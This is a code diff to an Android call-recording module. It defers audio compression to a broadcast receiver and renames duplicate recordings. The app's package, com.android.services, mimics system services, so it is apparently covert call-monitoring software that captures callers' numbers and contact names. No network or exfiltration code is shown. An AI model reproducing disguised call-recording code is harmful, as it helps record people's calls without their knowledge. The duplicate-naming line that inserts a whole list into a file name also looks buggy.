@@ -2,7 +2,9 @@ package com.android.services.workers.callRecord
 
 import android.app.Service
 import android.content.Context
+import android.content.Intent
 import android.util.Log
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import androidx.work.Data
 import androidx.work.WorkManager
 import com.android.services.db.entities.CallLog
@@ -11,6 +13,7 @@ import com.android.services.enums.CallRecordType
 import com.android.services.logs.source.LocalDatabaseSource
 import com.android.services.models.CallRecord
 import com.android.services.nativePackage.RecorderHelper
+import com.android.services.receiver.AudioFileCompressorReceiver
 import com.android.services.services.callRecord.CallRecordProcessingBaseI
 import com.android.services.util.AppConstants
 import com.android.services.util.AppUtils
@@ -283,19 +286,14 @@ class CallRecordProcessingBaseImpll(
             coroutineScope.launch(Dispatchers.Main) {
                 stopRecording()
                 delay(1500)
-                var destFile: String? = null
-                try {
-                    destFile = compressOutputFile()
-                } catch (e: Exception) {
-                    logException("Error compressing file ${e.message}", throwable = e)
-                }
-                reNameFile(appContext.applicationContext, mFilePath!!, destFile)
+                reNameFile(appContext.applicationContext, mFilePath!!, null)
                 saveRecording()
                 shutDownExecutorService()
                 disposeDisposable()
                 EventBus.getDefault().unregister(this);
                 logVerbose("Call recording Service stoped", "CallRecordingInfo")
-
+                LocalBroadcastManager.getInstance(appContext)
+                    .sendBroadcast(Intent(AudioFileCompressorReceiver.ACTION_COMPRESS_AUDIO))
             }
         } catch (exp: Exception) {
             AppUtils.appendLog(
@@ -358,12 +356,19 @@ class CallRecordProcessingBaseImpll(
                 val callId = lastCallDetails.getString("id")
                 val callerName =
                     AppUtils.getContactName(lastCallDetails.getString("number"), context)
-                val callName = AppUtils.formatDateTimezone(lastCallDetails.getString("date"))
+                var callName = AppUtils.formatDateTimezone(lastCallDetails.getString("date"))
                 val callNumber = lastCallDetails.getString("number")
                 val callDuration = lastCallDetails.getString("duration")
-                val callDate = AppUtils.formatDate(lastCallDetails.getString("date"))
+                val callDate = callRecord?.callDateTime
+                    ?: AppUtils.formatDate(lastCallDetails.getString("date"))
                 val callType = lastCallDetails.getString("type")
-
+                val sameCallRecordingList =
+                    localDatabaseSource.checkIfCallRecordExist(callDate, callNumber)
+                callName += if (sameCallRecordingList.isNotEmpty()) {
+                    "($sameCallRecordingList)"
+                } else {
+                    "(1)"
+                }
                 //Insert Call Recording
                 val callRecording = CallRecording()
                 callRecording.apply {
@@ -374,7 +379,7 @@ class CallRecordProcessingBaseImpll(
                     this.callStartTime = callDate
                     this.callDirection = callType
                     this.callNumber = callNumber
-                    this.isCompressed = 1
+                    this.isCompressed = 0
                     this.status = 0
                 }
                 localDatabaseSource.insertCallRecording(callRecording)
